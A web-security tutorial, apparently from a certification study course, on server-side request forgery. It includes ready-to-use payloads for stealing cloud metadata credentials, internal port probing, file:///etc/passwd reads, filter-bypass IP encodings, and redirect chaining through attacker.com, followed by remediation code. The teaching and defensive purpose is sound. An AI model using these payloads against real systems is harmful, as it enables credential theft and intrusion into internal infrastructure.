Server-Side Request Forgery (SSRF)

A critical vulnerability where an attacker manipulates a server into making requests to unintended destinations · typically internal infrastructure, cloud metadata endpoints, or private networks that should never be directly accessible from the internet.

Critical BSCP Intermediate-Advanced

Real-World Analogy

Hotel Receptionist Attack

Imagine you're at a hotel and you tell the front desk receptionist, "Please call room 404 for me." The receptionist makes the call without questioning where you're asking them to call from. But what if you actually say, "Please call 192.168.1.1 · the internal server room" or "Please call the manager's private office and read me back the guest list"? The receptionist (the web server) has access to places you don't · they're inside the building. By abusing their position, you've made them do things on your behalf that a customer could never do directly. That's SSRF.

🎯 Day 4 · SSRF Exploitation

Return to every SSRF surface flagged on Day 2. Start with the cloud metadata endpoint · it's the highest-value SSRF target:

# AWS IMDSv1 (no auth required)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP (requires header  · try without first)
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

Then try internal services: http://localhost:6379 (Redis), http://localhost:9200 (Elasticsearch), http://localhost:8080/admin (admin panel). Use Burp Collaborator or interactsh to confirm blind SSRF via DNS: http://YOUR.interactsh.com/test.

Chain it: SSRF → AWS metadata → IAM credentials → S3 bucket takeover. Or SSRF → internal Redis → session forgery → account takeover.

How It Works

SSRF occurs when a web application accepts user input that is used to construct and execute a server-side HTTP request without proper validation. The vulnerability allows an attacker to:

  1. Control the target URL. The attacker provides a URL parameter that the server will fetch.
  2. Access restricted resources. The server makes requests from within the internal network, bypassing firewall rules that block external access.
  3. Interact with internal services. Redis, Elasticsearch, admin panels, cloud metadata endpoints · all become accessible through the server-side request.
  4. Exfiltrate sensitive data. The response is often returned to the attacker or reveals information through timing/error messages.

Why is it dangerous? The victim server is trusted within its network · firewalls allow it to communicate with internal resources. By controlling what the server requests, you're using that trust against the infrastructure.

Where to Look

SSRF vulnerabilities are commonly found in features that fetch remote content:

  • URL parameters: url=, webhook=, callback=, redirect=, image=, fetch=, src=, link=
  • Profile picture import: "Import from URL" features that download images from user-supplied URLs.
  • PDF/document generation: Tools that render HTML to PDF often fetch external resources. Supply your own URL.
  • Webhooks & integrations: Features that register callbacks to third-party services may accept arbitrary URLs.
  • Preview/thumbnail generation: "Generate a preview of this URL" features.
  • Metadata fetching: Plugins or tools that retrieve metadata from a URL (Open Graph, RSS feeds, etc.).

Testing indicator: If you can make the server fetch a URL and either see the response or detect the request (via Burp Collaborator DNS interaction), you have SSRF.

Burp Suite Workflow

1
Identify the URL parameter. Navigate to a feature that fetches remote content (image upload by URL, webhook URL, etc.). In Burp Proxy, intercept the request and note the parameter name. 
POST /api/import-profile-pic HTTP/1.1
...
image_url=https://example.com/pic.jpg
2
Test localhost. Send the request to Repeater and change the URL to http://127.0.0.1/ or http://localhost/. Observe if you get a response, error, or timeout. 
image_url=http://127.0.0.1/
3
Probe internal ports. Try common internal service ports: 
http://127.0.0.1:3306/  (MySQL)
http://127.0.0.1:6379/  (Redis)
http://127.0.0.1:9200/  (Elasticsearch)
http://127.0.0.1:8080/  (Admin panels)
http://127.0.0.1:5432/  (PostgreSQL)
4
Use Burp Collaborator for blind SSRF. If responses aren't visible, generate a Burp Collaborator URL and see if the server makes a DNS or HTTP request to it. 
image_url=http://YOUR.burpcollaborator.net/test
Check the Collaborator tab for interactions.
5
Attack AWS metadata (if cloud-hosted). Many applications run on AWS. Try: 
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
6
Try file:// protocol. Test if the server accepts file:// URLs to read local files: 
image_url=file:///etc/passwd

IP Representation Tricks (Bypass Filters)

Applications may filter certain IP addresses. Try alternative representations of the same IP:

Decimal notation: http://2130706433/  (127.0.0.1 in decimal)
Hex notation: http://0x7f.0x0.0x0.0x1/
Octal notation: http://0177.0.0.1/
Short form: http://127.1/
Mixed: http://127.0.1/

WAF Bypass Techniques

IP Representation

If the WAF blocks 127.0.0.1 or 169.254.169.254, try alternative representations:

Decimal: 2130706433 for 127.0.0.1
Hex: 0x7f000001 for 127.0.0.1
Octal: 0177.0.0.1 for 127.0.0.1
Short IPv4: 127.1

Open Redirect Chaining

If the target site has an open redirect, chain it to reach internal resources:

Original SSRF: image_url=https://attacker.com/redirect?url=http://127.0.0.1/admin
Attacker controls redirect and forwards to internal IP

DNS Rebinding

Control a domain (attacker.com) and resolve it first to your attacker IP, then rebind it to 127.0.0.1 on a second lookup. The server may fetch it twice.

URL Shortener Abuse

Use a URL shortener (bit.ly, tinyurl) that the WAF trusts to hide the real destination:

image_url=https://bit.ly/[short-code-pointing-to-127.0.0.1]

Case Variation & Encoding

hTTp://127.0.0.1/
http://127.0.0.1%3f/
http://127.0.0.1%23/
http://[127.0.0.1]/

Protocol Fallback

Try alternative protocols if HTTP is blocked:

file:///etc/passwd
gopher://127.0.0.1:9200/
dict://127.0.0.1:6379/

Exploitation & Impact

Cloud Metadata Credential Theft

Impact: Critical. AWS, GCP, and Azure expose temporary credentials via metadata endpoints. Stealing these allows you to:

  • Assume the IAM role attached to the instance.
  • Pivot to S3 buckets, databases, or other cloud resources.
  • Escalate privileges and compromise the entire cloud environment.
Endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/
Response: { "AccessKeyId": "AKIA...", "SecretAccessKey": "...", "Token": "..." }

Internal Service Enumeration & Compromise

Impact: High. SSRF can reveal and compromise:

  • Redis: Unbraced instances on 6379 can be written to, leading to RCE via Lua scripts.
  • Elasticsearch: Port 9200 exposes indices; delete data or access sensitive information.
  • Admin panels: Internal dashboards on 8080 or 3000 (bypassing firewall rules).
  • Databases: Direct protocol interaction (MySQL, PostgreSQL) to extract data.

Local File Inclusion (via file://)

Impact: High. If file:// protocol is supported:

  • Read /etc/passwd to enumerate users.
  • Read application config files (.env, web.config) containing secrets.
  • Access SSH private keys (~/.ssh/id_rsa).
  • Read source code to find other vulnerabilities.

Port Scanning & Network Reconnaissance

Impact: Medium. Use timing differences or error messages to map the internal network:

  • Open ports timeout with different delays than closed ports.
  • Error messages reveal service versions.
  • Successful metadata endpoint requests confirm cloud hosting.

Denial of Service

Impact: Medium. Induce the server to make expensive requests:

  • Request large files from internal services, consuming bandwidth.
  • Cause the server to make recursive requests to itself (infinite redirect loops).

Remediation

1. Allowlist Permitted Domains & IPs

Only allow requests to a hardcoded list of trusted domains or IPs:

const ALLOWED_DOMAINS = ['cdn.example.com', 'api.partner.com'];
const urlObj = new URL(userInput);
if (!ALLOWED_DOMAINS.includes(urlObj.hostname)) {
  throw new Error('Domain not in allowlist');
}

2. Block Private IP Ranges

Prevent requests to RFC 1918 and loopback addresses:

const BLOCKED_RANGES = [
  /^127\./,           // Loopback
  /^10\./,            // Private class A
  /^172\.(1[6-9]|2[0-9]|3[01])\./,  // Private class B
  /^192\.168\./,      // Private class C
  /^169\.254\./,      // Link-local (includes AWS metadata)
  /^0\.0\.0\.0/,      // This host
];
const ip = await dns.lookup(userInput);
if (BLOCKED_RANGES.some(r => r.test(ip))) {
  throw new Error('Private IP address');
}

3. Resolve DNS & Validate Result

Perform DNS resolution and validate the result isn't private:

const net = require('net');
const dns = require('dns').promises;

async function isPrivateIP(hostname) {
  const address = await dns.resolve4(hostname);
  return net.isPrivate(address[0]);
}

4. Disable Unused Protocols

Restrict URL schemes to HTTP/HTTPS only:

const url = new URL(userInput);
if (!['http:', 'https:'].includes(url.protocol)) {
  throw new Error('Only HTTP/HTTPS allowed');
}

5. Use SSRF-Safe HTTP Clients

Libraries with built-in protections:

  • Python: Use ssrf-safe-requests or validate URLs before requests.
  • Node.js: axios with custom agent restrictions, or got with timeout/redirect limits.
  • Java: Avoid URLConnection; use OkHttp with strict socket factory.

6. Implement Timeouts & Limits

Prevent expensive requests and slow-loris attacks:

const response = await fetch(userInput, {
  timeout: 5000,           // 5 second timeout
  redirect: 'error',       // Fail on redirects
  size: 10 * 1024 * 1024   // Max 10 MB
});

7. Log & Monitor

Alert on requests to unusual destinations:

  • Any request to private IP ranges.
  • Any request to metadata endpoints.
  • Any use of file:// or non-HTTP protocols.

Common Beginner Mistakes

Only Testing 127.0.0.1

Mistake: Testers often try http://127.0.0.1/ and assume SSRF doesn't exist if it fails. Fix: Test multiple representations: localhost, 0.0.0.0, IPv6 [::1], decimal notation, and other private ranges like 10.0.0.0/8 and 192.168.0.0/16.

Forgetting Cloud Metadata Endpoints

Mistake: When testing cloud-hosted applications, forgetting to try 169.254.169.254 or provider-specific endpoints. Fix: Always test AWS, GCP, and Azure metadata endpoints. They're often the most valuable targets and worth significant effort to exploit.

Missing Blind SSRF

Mistake: If the server doesn't return the response body, assuming SSRF doesn't exist. Fix: Use Burp Collaborator to detect blind SSRF via DNS/HTTP interactions. The absence of visible output doesn't mean the request wasn't made.

Not Testing File Protocol

Mistake: Overlooking file:// and alternative protocols like gopher:// and dict://. Fix: Always test file:// for local file read. Check if /etc/passwd or config files are accessible.

Ignoring Redirect Parameters

Mistake: Only testing explicit URL parameters and missing implicit redirects. Fix: Look for redirect, callback, and webhook parameters that might accept URLs indirectly.
